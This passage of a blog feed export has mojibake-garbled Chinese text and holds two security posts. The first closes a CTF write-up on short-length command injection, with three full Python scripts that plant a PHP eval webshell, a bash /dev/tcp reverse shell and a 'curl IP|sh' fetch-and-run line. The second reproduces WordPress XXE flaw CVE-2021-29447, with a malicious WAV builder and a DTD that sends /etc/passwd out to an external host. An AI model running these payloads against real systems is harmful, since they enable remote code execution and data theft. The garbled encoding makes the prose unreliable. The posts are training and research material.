class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä¸ç½‘ä¸Šçš„é¢˜ç›®æ‰€ä¸åŒï¼Œç½‘ä¸Šçš„é¢˜ç›®éƒ½æ˜¯æ–°å»ºäº†ä¸€ä¸ªsandboxç›®å½•ï¼Œé‡Œé¢æ˜¯å•¥éƒ½æ²¡æœ‰çš„ï¼Œä½†æ˜¯æˆ‘ä»¬è¿™é‡Œæœ‰ä¸€ä¸ª<code>index.php</code>ï¼Œæ‰€ä»¥å¾—å¦æƒ³åŠæ³•ã€‚  </p><p><code>dir</code>å’Œ<code>ls</code>æ˜¯æœ‰æ‰€ä¸åŒçš„ï¼Œ<code>dir</code>çš„è¾“å‡ºé‡å®šå‘åˆ°æ–‡ä»¶æ—¶æ˜¯ä¸ä¼šæ¢è¡Œçš„ï¼Œä½†æ˜¯<code>ls</code>ä¼šï¼Œæ‰€ä»¥ä½¿ç”¨<code>dir</code>æ—¶ä¸ç”¨è€ƒè™‘åœ¨åé¢åŠ ä¸€ä¸ª<code>\</code>ï¼Œåªéœ€è¦è€ƒè™‘é¡ºåºï¼Œä½†æ˜¯<code>ls</code>éœ€è¦è€ƒè™‘æ¢è¡Œã€‚  </p><p>ä¸»è¦å°±æ˜¯éœ€è¦æ„é€ å‡ºä¸€ä¸ª<code>ls -t</code>  </p><h5 id="å¯ç”¨è„šæœ¬"><a href="#å¯ç”¨è„šæœ¬" class="headerlink" title="å¯ç”¨è„šæœ¬"></a>å¯ç”¨è„šæœ¬</h5><pre class="line-numbers language-none"><code class="language-none"># -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2022-05-06 13:25:41# @Last Modified by:   h1xa# @Last Modified time: 2022-05-10 20:55:42# @email: h1xa@ctfer.com# @link: https:&#x2F;&#x2F;ctfer.comimport requestsimport timeurl &#x3D; &quot;http:&#x2F;&#x2F;0523928c-154c-4591-b17d-e2d71e82afc9.challenge.ctf.show&#x2F;&quot;payload &#x3D; [    &#39;&gt;sl&#39;,    &#39;&gt;kt-&#39;,    &#39;&gt;j\\&gt;&#39;,    &#39;&gt;j\\#&#39;,    &#39;&gt;dir&#39;,    &#39;*&gt;v&#39;,    &#39;&gt;rev&#39;,    &#39;*v&gt;x&#39;,    &#39;&gt;php&#39;,    &#39;&gt;a.\\&#39;,    &#39;&gt;\\&gt;\\&#39;,    &#39;&gt;-d\\&#39;,    &#39;&gt;\\ \\&#39;,    &#39;&gt;64\\&#39;,    &#39;&gt;se\\&#39;,    &#39;&gt;ba\\&#39;,    &#39;&gt;\\|\\&#39;,    &#39;&gt;4&#x3D;\\&#39;,    &#39;&gt;Pz\\&#39;,    &#39;&gt;k7\\&#39;,    &#39;&gt;XS\\&#39;,    &#39;&gt;sx\\&#39;,    &#39;&gt;VF\\&#39;,    &#39;&gt;dF\\&#39;,    &#39;&gt;X0\\&#39;,    &#39;&gt;gk\\&#39;,    &#39;&gt;bC\\&#39;,    &#39;&gt;Zh\\&#39;,    &#39;&gt;ZX\\&#39;,    &#39;&gt;Ag\\&#39;,    &#39;&gt;aH\\&#39;,    &#39;&gt;9w\\&#39;,    &#39;&gt;PD\\&#39;,    &#39;&gt;S&#125;\\&#39;,    &#39;&gt;IF\\&#39;,    &#39;&gt;&#123;\\&#39;,    &#39;&gt;\\$\\&#39;,    &#39;&gt;ho\\&#39;,    &#39;&gt;ec\\&#39;,    &#39;sh x&#39;,    &#39;sh j&#39;]def writeFile(payload):    data &#x3D; &#123;        &quot;cmd&quot;: payload    &#125;    requests.post(url, data&#x3D;data)def run():    for p in payload:        writeFile(p.strip())        print(&quot;[*] create &quot; + p.strip())        time.sleep(1)def check():    response &#x3D; requests.get(url + &quot;a.php&quot;)    if response.status_code &#x3D;&#x3D; requests.codes.ok:        print(&quot;[*] Attack success!!!Webshell is &quot; + url + &quot;a.php&quot;)def main():    run()    check()if __name__ &#x3D;&#x3D; &#39;__main__&#39;:    main()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="æ²¡æœ‰dirä½†å¯å‡ºç½‘çš„å››å­—ç¬¦å‘½ä»¤æ‰§è¡Œ"><a href="#æ²¡æœ‰dirä½†å¯å‡ºç½‘çš„å››å­—ç¬¦å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="æ²¡æœ‰dirä½†å¯å‡ºç½‘çš„å››å­—ç¬¦å‘½ä»¤æ‰§è¡Œ"></a>æ²¡æœ‰dirä½†å¯å‡ºç½‘çš„å››å­—ç¬¦å‘½ä»¤æ‰§è¡Œ</h4><p>æ¼æ´ä»£ç åŒä¸Šï¼Œåªä¸è¿‡ä¸å¯ä»¥æ‰§è¡Œ<code>dir</code>å‘½ä»¤äº†ã€‚  </p><p>è¿™é‡Œç”±äºç›®å½•ä¸‹é¢å¯å†™ï¼Œæ‰€ä»¥ç¾¤ä¸»ç”¨äº†ä¸€ç§ç›´æ¥å†™çš„æ–¹æ³•ï¼Œæˆ‘å…ˆæ˜¯å°è¯•äº†åœ¨è‡ªå·±çš„vpså†™ä¸‹è¿™ä¸€å¥è¯<code>bash -i &gt;&amp; /dev/tcp/175.178.47.228/8888 0&gt;&amp;1</code>ï¼Œç„¶åè·‘è„šæœ¬ï¼Œå‘ç°å¥½åƒæ²¡ä»€ä¹ˆç”¨ï¼Œåº”è¯¥æ˜¯ç¯å¢ƒå¯èƒ½æ²¡æœ‰bashå§ã€‚  </p><p>ç„¶åå°è¯•ç¾¤ä¸»çš„å†™å…¥ä¸€ä¸ªä¸€å¥è¯æœ¨é©¬æ–‡ä»¶ï¼š<code>echo PD9waHAgZXZhbCgkX0dFVFsxXSk7|base64 -d&gt;1.php</code></p><p><strong>æ³¨æ„</strong>ï¼šå¿˜è®°äº†ä¸€ä¸ªé‡è¦äº‹æƒ…ï¼Œä¸è¦æŠŠç‚¹å·<code>.</code>å†™åœ¨å‰é¢ï¼Œè¿™æ ·<code>ls</code>ä¸å‡ºæ¥ã€‚</p><h5 id="é€šç”¨è„šæœ¬ï¼ˆå¥½åƒåªèƒ½curlçº¯æ•°å­—ç½‘å€ï¼Œä¸çŸ¥é“ä¸ºå•¥"><a href="#é€šç”¨è„šæœ¬ï¼ˆå¥½åƒåªèƒ½curlçº¯æ•°å­—ç½‘å€ï¼Œä¸çŸ¥é“ä¸ºå•¥" class="headerlink" title="é€šç”¨è„šæœ¬ï¼ˆå¥½åƒåªèƒ½curlçº¯æ•°å­—ç½‘å€ï¼Œä¸çŸ¥é“ä¸ºå•¥"></a>é€šç”¨è„šæœ¬ï¼ˆå¥½åƒåªèƒ½curlçº¯æ•°å­—ç½‘å€ï¼Œä¸çŸ¥é“ä¸ºå•¥</h5><pre class="line-numbers language-none"><code class="language-none"># -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2022-05-06 13:25:41# @Last Modified by:   h1xa# @Last Modified time: 2022-05-10 20:55:58# @email: h1xa@ctfer.com# @link: https:&#x2F;&#x2F;ctfer.comimport requestsimport timeurl &#x3D; &quot;http:&#x2F;&#x2F;133b9eb2-eae5-41d8-81ab-2068c492aca6.challenge.ctf.show&#x2F;&quot;payload &#x3D; [    &#39;&gt;\\ \\&#39;,    &#39;&gt;-t\\&#39;,    &#39;&gt;\\&gt;a&#39;,    &#39;&gt;ls\\&#39;,    &#39;ls&gt;v&#39;,    &#39;&gt;mv&#39;,    &#39;&gt;vt&#39;,    &#39;*v*&#39;,    &#39;&gt;ls&#39;,    &#39;l*&gt;t&#39;,    &#39;&gt;cat&#39;,    &#39;*t&gt;z&#39;,    # curl 2030350346|sh    # curl 175.178.47.228|sh    # curl 2947690468|sh    &#39;&gt;sh&#39;,    &#39;&gt;\\|\\&#39;,    &#39;&gt;68\\&#39;,    &#39;&gt;04\\&#39;,    &#39;&gt;69\\&#39;,    &#39;&gt;47\\&#39;,    &#39;&gt;29\\&#39;,    &#39;&gt;\\ \\&#39;,    &#39;&gt;rl\\&#39;,    &#39;&gt;cu\\&#39;,    &#39;sh z&#39;,    &#39;sh a&#39;,]def writeFile(payload):    data &#x3D; &#123;        &quot;cmd&quot;: payload    &#125;    requests.post(url, data&#x3D;data)def run():    for p in payload:        writeFile(p.strip())        print(&quot;[*] create &quot; + p.strip())        time.sleep(1)def check():    response &#x3D; requests.get(url + &quot;1.php&quot;)    if response.status_code &#x3D;&#x3D; requests.codes.ok:        print(&quot;[*] Attack success!!!Webshell is &quot; + url + &quot;1.php&quot;)def main():    run()    check()if __name__ &#x3D;&#x3D; &#39;__main__&#39;:    main()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="ä¸å‡ºç½‘çš„4å­—ç¬¦getshell"><a href="#ä¸å‡ºç½‘çš„4å­—ç¬¦getshell" class="headerlink" title="ä¸å‡ºç½‘çš„4å­—ç¬¦getshell"></a>ä¸å‡ºç½‘çš„4å­—ç¬¦getshell</h4><p>æ¼æ´ä»£ç åŒä¸Šï¼Œè¿™ä¸€æ¬¡ä¸å¯ä»¥å‡ºç½‘äº†ï¼Œå› æ­¤curlã€wgetä»€ä¹ˆçš„éƒ½æ²¡ç”¨äº†ï¼Œè¿™é‡Œç›´æ¥æ”¾è„šæœ¬å§ï¼  </p><h5 id="ï¼ˆæ„Ÿè§‰æ˜¯é€šæ€è„šæœ¬"><a href="#ï¼ˆæ„Ÿè§‰æ˜¯é€šæ€è„šæœ¬" class="headerlink" title="ï¼ˆæ„Ÿè§‰æ˜¯é€šæ€è„šæœ¬"></a>ï¼ˆæ„Ÿè§‰æ˜¯é€šæ€è„šæœ¬</h5><pre class="line-numbers language-none"><code class="language-none"># -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2022-05-06 13:25:41# @Last Modified by:   h1xa# @Last Modified time: 2022-05-10 20:56:17# @email: h1xa@ctfer.com# @link: https:&#x2F;&#x2F;ctfer.comimport requestsimport timeurl &#x3D; &quot;http:&#x2F;&#x2F;ab1290cc-c3f0-4ff2-b864-a4388d4331a6.challenge.ctf.show&#x2F;&quot;payload &#x3D; [    &#39;&gt;\\ \\&#39;,    &#39;&gt;-t\\&#39;,    &#39;&gt;\\&gt;a&#39;,    &#39;&gt;ls\\&#39;,    &#39;ls&gt;v&#39;,    &#39;&gt;mv&#39;,    &#39;&gt;vt&#39;,    &#39;*v*&#39;,    &#39;&gt;ls&#39;,    &#39;l*&gt;t&#39;,    &#39;&gt;cat&#39;,    &#39;*t&gt;z&#39;,    &#39;&gt;php&#39;,    &#39;&gt;a.\\&#39;,    &#39;&gt;\\&gt;\\&#39;,    &#39;&gt;-d\\&#39;,    &#39;&gt;\\ \\&#39;,    &#39;&gt;64\\&#39;,    &#39;&gt;se\\&#39;,    &#39;&gt;ba\\&#39;,    &#39;&gt;\\|\\&#39;,    &#39;&gt;4&#x3D;\\&#39;,    &#39;&gt;Pz\\&#39;,    &#39;&gt;k7\\&#39;,    &#39;&gt;XS\\&#39;,    &#39;&gt;sx\\&#39;,    &#39;&gt;VF\\&#39;,    &#39;&gt;dF\\&#39;,    &#39;&gt;X0\\&#39;,    &#39;&gt;gk\\&#39;,    &#39;&gt;bC\\&#39;,    &#39;&gt;Zh\\&#39;,    &#39;&gt;ZX\\&#39;,    &#39;&gt;Ag\\&#39;,    &#39;&gt;aH\\&#39;,    &#39;&gt;9w\\&#39;,    &#39;&gt;PD\\&#39;,    &#39;&gt;S&#125;\\&#39;,    &#39;&gt;IF\\&#39;,    &#39;&gt;&#123;\\&#39;,    &#39;&gt;\\$\\&#39;,    &#39;&gt;ho\\&#39;,    &#39;&gt;ec\\&#39;,    &#39;sh z&#39;,    &#39;sh a&#39;]def writeFile(payload):    data &#x3D; &#123;        &quot;cmd&quot;: payload    &#125;    requests.post(url, data&#x3D;data)def run():    for p in payload:        writeFile(p.strip())        print(&quot;[*] create &quot; + p.strip())        time.sleep(1)def check():    response &#x3D; requests.get(url + &quot;a.php&quot;)    if response.status_code &#x3D;&#x3D; requests.codes.ok:        print(&quot;[*] Attack success!!!Webshell is &quot; + url + &quot;a.php&quot;)def main():    run()    check()if __name__ &#x3D;&#x3D; &#39;__main__&#39;:    main()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h4><p>1ã€æœ€å°‘å¯ä»¥åœ¨4å­—ç¬¦çš„æ— <code>dir</code>çš„ç¯å¢ƒä¸‹æ‹¼æ¥<code>ls -t</code>  </p><p>2ã€å½“ç©ºæ ¼ä¸å¤Ÿç”¨çš„æ—¶å€™ï¼Œå¯ä»¥ä½¿ç”¨ç‰¹æ®Šå­—ç¬¦<code>$&#123;IFS&#125;</code>ä»£æ›¿ï¼Œä½†æ˜¯éœ€è¦æ³¨æ„å‘½ä»¤éƒ¨åˆ†ä¸èƒ½æœ‰é‡å¤çš„å­—ç¬¦ç»„åˆã€‚  </p><p>3ã€éœ€è¦æ ¹æ®ç¯å¢ƒé€‰æ‹©<code>getshell</code>çš„æ–¹æ³•ï¼Œæœ‰<code>curl</code>ã€<code>wget</code>ã€å¼ºåˆ¶ä¸Šä¼ ã€ä¸å‡ºç½‘ç­‰ç­‰ï¼Œä¸è¦æ‹˜æ³¥äºå„ç§å§¿åŠ¿ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2021-29447</title>
      <link href="/2022/05/08/cve-2021-29447/"/>
      <url>/2022/05/08/cve-2021-29447/</url>
      
        <content type="html"><![CDATA[<h2 id="WordPressåœ¨PHP8ä¸‹ç»è¿‡èº«ä»½éªŒè¯çš„åª’ä½“åº“XXEæ¼æ´"><a href="#WordPressåœ¨PHP8ä¸‹ç»è¿‡èº«ä»½éªŒè¯çš„åª’ä½“åº“XXEæ¼æ´" class="headerlink" title="WordPressåœ¨PHP8ä¸‹ç»è¿‡èº«ä»½éªŒè¯çš„åª’ä½“åº“XXEæ¼æ´"></a>WordPressåœ¨PHP8ä¸‹ç»è¿‡èº«ä»½éªŒè¯çš„åª’ä½“åº“XXEæ¼æ´</h2><h2 id="CVE-2021-29447"><a href="#CVE-2021-29447" class="headerlink" title="CVE-2021-29447"></a>CVE-2021-29447</h2><h2 id="äº§å“ä»‹ç»"><a href="#äº§å“ä»‹ç»" class="headerlink" title="äº§å“ä»‹ç»"></a>äº§å“ä»‹ç»</h2><p>WordPressæ˜¯ä¸€æ¬¾èƒ½å»ºç«‹å‡ºè‰²ç½‘ç«™ã€åšå®¢æˆ–åº”ç”¨ç¨‹åºçš„å¼€æºè½¯ä»¶ã€‚</p><h2 id="æ¼æ´ç®€ä»‹"><a href="#æ¼æ´ç®€ä»‹" class="headerlink" title="æ¼æ´ç®€ä»‹"></a>æ¼æ´ç®€ä»‹</h2><h3 id="æ¼æ´å±å®³ï¼š"><a href="#æ¼æ´å±å®³ï¼š" class="headerlink" title="æ¼æ´å±å®³ï¼š"></a>æ¼æ´å±å®³ï¼š</h3><p>ç ”ç©¶äººå‘˜åœ¨WordPressä¸­æ–°å‘ç°äº†ä¸€ä¸ªçš„XXEæ¼æ´(CVE-2021-29447)ï¼Œè¿œç¨‹æ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¯¥æ¼æ´è®¿é—®ä»»æ„å†…éƒ¨æ–‡ä»¶ï¼Œå¹¶å®ç°æœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ (SSRF)ã€‚</p><h3 id="æ¼æ´åŸå› "><a href="#æ¼æ´åŸå› " class="headerlink" title="æ¼æ´åŸå› "></a>æ¼æ´åŸå› </h3><p>ä¸»è¦æ˜¯åœ¨<code>wp-includes/ID3/getid3.lib.php</code></p><p><img src="/images/xml/code.png" class="lazyload placeholder" data-srcset="/images/xml/code.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="img">   </p><p>wordpressæœ‰ä¸€ä¸ªåª’ä½“åº“ï¼Œç»è¿‡èº«ä»½éªŒè¯çš„ç”¨æˆ·å¯ä»¥ä¸Šä¼ åª’ä½“æ–‡ä»¶ä»¥ä¾¿åç»­ä½¿ç”¨ï¼Œå†ä¸Šä¼ åª’ä½“æ–‡ä»¶æ—¶ï¼Œwordpressä¼šè°ƒç”¨getid3è¿™ä¸ªåº“ï¼Œæå–ä¸Šä¼ åª’ä½“æ–‡ä»¶çš„å…ƒä¿¡æ¯ï¼Œå…¶ä¸­ä¸€äº›æ•°æ®ä¼šä»¥XMLçš„æ ¼å¼è¿›è¡Œè§£æï¼Œå› æ­¤æ‰€ä»¥åœ¨ä¸€å®šæ¡ä»¶ä¸‹ä¼šå¯¼è‡´XXEæ¼æ´ã€‚2014å¹´ï¼ŒWordPress 3.9.2ä¸­æ·»åŠ äº†ä¸€ä¸ªç¦ç”¨å¤–éƒ¨å®ä½“libxml_disable_entity_loader(true)çš„è°ƒç”¨ï¼Œä»¥ä¿®å¤ä¸€ä¸ªXXEæ¼æ´ã€‚éšç€php8çš„å‘å¸ƒï¼Œæœ‰å…³çš„ä»£ç è¢«ç•¥ä½œä¿®æ”¹ï¼Œä»¥é€‚åº”libxml_disable_entity_loader()å‡½æ•°çš„å¼ƒç”¨ã€‚å› ä¸ºPHPæ–°ç‰ˆæœ¬ä½¿ç”¨Libxml2 v2.9+ï¼Œé»˜è®¤æƒ…å†µä¸‹ä¼šç¦ç”¨å¤–éƒ¨å®ä½“è·å–ã€‚å› æ­¤ï¼Œåªæœ‰å½“è¿è¡Œçš„PHPç‰ˆæœ¬ï¼œ8æ—¶ï¼Œæ‰éœ€è°ƒç”¨è¯¥å‡½æ•°ã€‚æ‰€ä»¥å½“phpå¤§äºç­‰äº8æ—¶ï¼Œä¾¿å¯ä»¥åˆ©ç”¨è¿™ä¸ªç‰¹ç‚¹ã€‚è™½ç„¶simplexml_load_string()å‡½æ•°è°ƒç”¨å¹¶ä¸æ˜¯é»˜è®¤çš„ã€‚å³ä½¿åç§°å¯èƒ½ä¸å»ºè®®ä½¿ç”¨ï¼ŒLIBXML_NOENTæ ‡å¿—ä¹Ÿä¼šå¯ç”¨å®ä½“æ›¿æ¢ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼ŒLIBXML_NOENTæ„å‘³ç€ç»“æœä¸­å°†ä¸ä¿ç•™ä»»ä½•å®ä½“ï¼Œå› æ­¤å°†æå–å¹¶æ›¿æ¢å¤–éƒ¨å®ä½“ã€‚å¦‚æ­¤ä¸€æ¥ï¼Œä¾¿å¯ä»¥åœ¨è¿è¡ŒPHP 8çš„WordPressä¸Šï¼Œåˆ©ç”¨å·²åœ¨WordPress 3.9.2ä¸­ä¿®å¤çš„XXEæ¼æ´ã€‚</p><h3 id="å½±å“äº§å“ï¼š"><a href="#å½±å“äº§å“ï¼š" class="headerlink" title="å½±å“äº§å“ï¼š"></a>å½±å“äº§å“ï¼š</h3><p><img src="/images/xml/version.png" class="lazyload placeholder" data-srcset="/images/xml/version.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="img"> </p><h2 id="è¡¥ä¸åˆ†æ"><a href="#è¡¥ä¸åˆ†æ" class="headerlink" title="è¡¥ä¸åˆ†æ"></a>è¡¥ä¸åˆ†æ</h2><p><img src="/images/xml/recover.png" class="lazyload placeholder" data-srcset="/images/xml/recover.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="img"> </p><p>é‡æ–°å¼•å…¥libxml_disable_entity_loader(true)çš„è°ƒç”¨ï¼Œæˆ–è€…é‡æ–°å¼•å…¥å¦å¤–ä¸€ç§æ–¹æ³•libxml_set_external_entity_loaderï¼ˆï¼‰</p><h2 id="æ¼æ´è°ƒè¯•ç¯å¢ƒæ­å»º"><a href="#æ¼æ´è°ƒè¯•ç¯å¢ƒæ­å»º" class="headerlink" title="æ¼æ´è°ƒè¯•ç¯å¢ƒæ­å»º"></a>æ¼æ´è°ƒè¯•ç¯å¢ƒæ­å»º</h2><p>å¯ä»¥å»WPScanå®˜ç½‘ä¸‹è½½å¯¹åº”ç‰ˆæœ¬æ‰‹åŠ¨æ­å»ºï¼Œä¾‹å¦‚ä¸‹é¢çš„5.6.2ç‰ˆæœ¬ï¼š</p><p><a href="https://wpscan.com/wordpress/562">https://wpscan.com/wordpress/562</a></p><p>ä¹Ÿèƒ½ä½¿ç”¨dockerç›´æ¥æ­å»ºï¼š</p><p><a href="https://github.com/motikan2010/CVE-2021-29447">https://github.com/motikan2010/CVE-2021-29447</a></p><h2 id="æ¼æ´åˆ©ç”¨åŠä»£ç åˆ†æ"><a href="#æ¼æ´åˆ©ç”¨åŠä»£ç åˆ†æ" class="headerlink" title="æ¼æ´åˆ©ç”¨åŠä»£ç åˆ†æ"></a>æ¼æ´åˆ©ç”¨åŠä»£ç åˆ†æ</h2><h3 id="åˆ©ç”¨æ–¹æ³•"><a href="#åˆ©ç”¨æ–¹æ³•" class="headerlink" title="åˆ©ç”¨æ–¹æ³•"></a>åˆ©ç”¨æ–¹æ³•</h3><p>åˆ©ç”¨ä¸‹æ–¹è¯­å¥æ„é€ waveæ ¼å¼çš„æ¶æ„éŸ³é¢‘æ–‡ä»¶ï¼Œä¸»è¦å°±æ˜¯ä½¿ç”¨æœ€å°å¿…è¦çš„waveç»“æ„åŠ ä¸Šæ¶æ„æœ‰æ•ˆè½½è·å¾—åˆ°payload.wav</p><pre class="line-numbers language-none"><code class="language-none">echo -en &#39;RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY[&lt;!ENTITY % remote SYSTEM &#39;&quot;&#39;&quot;&#39;http:&#x2F;&#x2F;175.178.47.228:8888&#x2F;evil.dtd&#39;&quot;&#39;&quot;&#39;&gt;%remote;%init;%trick;]&gt;\x00&#39; &gt; payload.wav<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ç„¶ååœ¨è‡ªå·±çš„VPSä¸‹å†™å…¥evil.dtd</p><pre class="line-numbers language-none"><code class="language-none">&lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;zlib.default&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;&#x2F;etc&#x2F;passwd&quot;&gt;&lt;!ENTITY %init &quot;&lt;!ENTITY % trick SYSTEM &#39;http:&#x2F;&#x2F;VPS:PORT&#x2F;?p&#x3D;%file&#39;&quot;&gt; <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>æœ€ååœ¨è¯¥ç›®å½•ä¸‹ç”¨phpå¯åŠ¨ä¸€ä¸ªwebæœåŠ¡å™¨</p><pre class="line-numbers language-none"><code class="language-none">php -S 0.0.0.0:PORT<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ç„¶åç”¨æˆ·ç™»å½•wordpressåœ¨åª’ä½“åº“ä¸Šä¼ ä¸Šé¢ç²¾å¿ƒæ„é€ çš„payload.wavå°±å¯ä»¥å®ç°ssrfï¼Œè®¿é—®å†…éƒ¨çš„ä»»æ„æ–‡ä»¶ï¼Œå¤–å¸¦å‡ºbase64åŠ å¯†å’Œzlibå‹ç¼©è¿‡çš„å†…å®¹ã€‚  </p><p>æœ€åé€šè¿‡phpè§£å‡ºå®é™…å†…å®¹å³å¯</p><pre class="line-numbers language-none"><code class="language-none">echo zlib_decode(base64_decode(&#39;å†…å®¹&#39;));<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="å®é™…æµç¨‹"><a href="#å®é™…æµç¨‹" class="headerlink" title="å®é™…æµç¨‹"></a>å®é™…æµç¨‹</h3><p>åœ¨&#x2F;wp-adminç•Œé¢ç™»å½•ä¸€ä¸ªæœ‰ä¸Šä¼ åª’ä½“æ–‡ä»¶æƒé™çš„ç”¨æˆ·ï¼Œç„¶ååœ¨&#x2F;wp-admin&#x2F;media-new.phpä¸Šä¼ ï¼ˆlinuxä¸‹ä½¿ç”¨dockeræ­å»ºçš„ç¯å¢ƒä¸Šä¼ ä¸ä¼šæŠ¥é”™ï¼Œä½†æ˜¯windowsä¸‹ç”¨phpstudyæ­å»ºçš„ä¸Šä¼ ä¼šæŠ¥é”™ï¼Œè™½ç„¶æŠ¥é”™ä½†æ˜¯ä»æœ‰ä¿¡æ¯è¢«å¤–å¸¦å‡ºæ¥äº†ï¼‰ï¼š  </p><p><img src="/images/xml/upload.png" class="lazyload placeholder" data-srcset="/images/xml/upload.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg">    </p><p>è§¦å‘å¤–å¸¦å‡ºæœ‰æ•ˆä¿¡æ¯ï¼š  </p><p><img src="/images/xml/get.png" class="lazyload placeholder" data-srcset="/images/xml/get.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"></p><p>æœ€åphpè§£å‹å’Œè§£å¯†å³å¯ï¼š</p><p><img src="/images/xml/decode.png" class="lazyload placeholder" data-srcset="/images/xml/decode.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"></p><p>ç»è¿‡å°è¯•ï¼Œæ–‡ä»¶å¦‚æœåˆ°è¾¾ä¸€å®šçš„é•¿åº¦åæ˜¯å¤–å¸¦ä¸å‡ºæ¥çš„ã€‚</p><h3 id="ä»£ç åˆ†æ"><a href="#ä»£ç åˆ†æ" class="headerlink" title="ä»£ç åˆ†æ"></a>ä»£ç åˆ†æ</h3><p> ä¸Šä¼ æ¶æ„wavæ–‡ä»¶ï¼Œdebugä¸€ä¸‹ï¼Œå¤§è‡´çš„å‡½æ•°ç»“æ„å¦‚ä¸‹ï¼š</p><p><img src="/images/xml/function.png" class="lazyload placeholder" data-srcset="/images/xml/function.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"></p><p> åœ¨è§£æxmlçš„åœ°æ–¹ä¸‹äº†æ–­ç‚¹ï¼Œå¯ä»¥çœ‹åˆ°å½“phpç‰ˆæœ¬å¤§äº8.0æ—¶ï¼Œæ²¡æœ‰è¿›å…¥é‚£ä¸¤ä¸ªifï¼Œå°±ä¸ä¼šç¦ç”¨å¤–éƒ¨å®ä½“ï¼Œå°±ä¼šè¿›è¡Œè§£æï¼Œè¿™é‡Œè‡ªå·±çš„vpså°±å·²ç»å¯ä»¥æ”¶åˆ°ç»“æœäº†ï¼Œå› æ­¤é€ æˆäº†xxeæ³¨å…¥ã€‚</p><p> <img src="/images/xml/getid3.png" class="lazyload placeholder" data-srcset="/images/xml/getid3.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"></p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>ç»è¿‡æœ¬æ¬¡CVEçš„å¤ç°ï¼ŒåŠ 